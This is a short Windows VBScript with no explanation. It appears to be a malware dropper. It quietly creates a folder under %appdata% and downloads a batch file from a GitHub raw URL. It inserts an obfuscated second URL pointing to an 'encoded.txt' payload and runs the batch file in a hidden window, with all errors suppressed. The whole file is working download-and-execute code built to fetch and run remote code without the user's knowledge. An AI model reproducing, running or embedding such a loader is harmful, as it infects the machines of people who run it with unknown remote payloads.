On Error Resume Next

Set fso = CreateObject("Scripting.FileSystemObject")

fso.CreateFolder CreateObject("WScript.Shell").ExpandEnvironmentStrings("%appdata%\paged-l")

Set http = CreateObject("MSXML2.XMLHTTP"): http.Open "GET", "https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/Main.txt", False: http.Send
If http.Status = 200 Then fso.CreateTextFile(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%appdata%\paged-l\special.bat")).Write http.ResponseText
WScript.Sleep 5000

Set sh = CreateObject("WScript.Shell"): f = sh.ExpandEnvironmentStrings("%appdata%\paged-l\special.bat"): Set a = fso.OpenTextFile(f, 1): s = a.ReadAll: a.Close: Set a = fso.OpenTextFile(f, 2): a.Write Replace(s, "****", "https:$$github.com$fatim759$done$raw$refs$heads$main$encoded.txt"): a.Close

sh.Run "cmd /c timeout /t 5 & %appdata%\paged-l\special.bat", 0, False